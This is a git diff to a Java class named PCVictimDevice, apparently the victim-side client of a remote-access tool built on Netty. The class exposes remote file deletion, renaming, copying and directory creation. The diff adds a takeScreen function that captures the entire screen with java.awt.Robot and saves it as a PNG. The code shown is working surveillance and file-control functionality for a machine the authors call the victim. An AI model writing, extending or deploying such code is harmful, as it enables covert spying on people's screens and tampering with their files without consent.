@@ -13,9 +13,13 @@ import io.netty.channel.socket.nio.NioSocketChannel;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.nio.channels.FileChannel;
 import java.util.Scanner;
 
@@ -150,7 +154,7 @@ public class PCVictimDevice {
         pcVictimDeviceHandler.sendMessage(response);
     }
 
-    public static boolean deleteFile(String dir) {
+    static boolean deleteFile(String dir) {
         File dirFile = new File(dir);
         if (dirFile.delete()) return true;
         File[] files = dirFile.listFiles();
@@ -165,17 +169,17 @@ public class PCVictimDevice {
         return dirFile.delete() && isDeleted;
     }
 
-    public static boolean renameFile(String path, String newPath) {
+    static boolean renameFile(String path, String newPath) {
         File file = new File(path);
         return file.renameTo(new File(newPath));
     }
 
-    public static boolean makeDir(String path) {
+    static boolean makeDir(String path) {
         File newDir = new File(path);
         return newDir.mkdir();
     }
 
-    public static boolean copyFile(String path, String newPath) {
+    static boolean copyFile(String path, String newPath) {
         if (path.equals(newPath)) return false;
 
         File sourceFile = new File(path);
@@ -206,6 +210,35 @@ public class PCVictimDevice {
             return false;
         }
         return true;
+    }
+
+    static boolean takeScreen(String path) {
+        try {
+            BufferedImage screenshot =  new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())) ;
+            String filename = findFreeFilename("screen.png", path);
+            if (filename == null) return false;
+            ImageIO.write(screenshot, "png", new File(path, filename));
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
+        }
+        return true;
+    }
+
+    private static String findFreeFilename(String startFilename, String path) {
+        File file = new File(path, startFilename);
+        if (!file.exists()) return startFilename;
+
+        String name = startFilename.split("\\.")[0];
+        String extension = "."+startFilename.split("\\.")[1];
+
+        int i = 2;
+        while (i < 100_000) {
+            file = new File(path, name+i+extension);
+            if (!file.exists()) return name+i+extension;
+            i++;
+        }
+        return null;
     }
 
     public static void main(String[] args) throws Exception {
